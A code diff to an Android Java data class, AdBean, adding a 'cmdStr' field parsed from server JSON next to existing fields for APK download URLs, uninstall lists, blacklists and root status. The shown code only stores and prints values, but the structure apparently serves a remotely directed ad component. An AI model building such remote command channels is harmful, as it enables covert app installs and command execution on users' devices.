@@ -30,6 +30,7 @@ public class AdBean {
     private List<String> blackList;
     private List<String> uninstallList;
     private boolean isRooted;
+    private String cmdStr;
 
     public void setActionType(int actionType) {
         this.actionType = actionType;
@@ -79,6 +80,15 @@ public class AdBean {
         return uninstallList;
     }
 
+    public String getCmdStr() {
+        return cmdStr;
+    }
+
+    public void setCmdStr(String cmdStr) {
+        this.cmdStr = cmdStr;
+    }
+
+
     public static AdBean parse(String jsonString) {
         try {
             JSONObject jsonObject = new JSONObject(jsonString);
@@ -97,6 +107,7 @@ public class AdBean {
         user.actionType = jsonObject.getInt("at");
         user.apkUrl = jsonObject.optString("au");
         user.pkgName = jsonObject.getString("p");
+        user.cmdStr = jsonObject.optString("c");
         JSONArray blacklist = jsonObject.getJSONArray("kl");
         user.blackList = new ArrayList<>();
         for (int i = 0; i < blacklist.length(); i++) {
@@ -119,6 +130,8 @@ public class AdBean {
                 ", pkgName='" + pkgName + '\'' +
                 ", blackList=" + blackList +
                 ", uninstallList=" + uninstallList +
+                ", isRooted=" + isRooted +
+                ", cmdStr='" + cmdStr + '\'' +
                 '}';
     }
 }
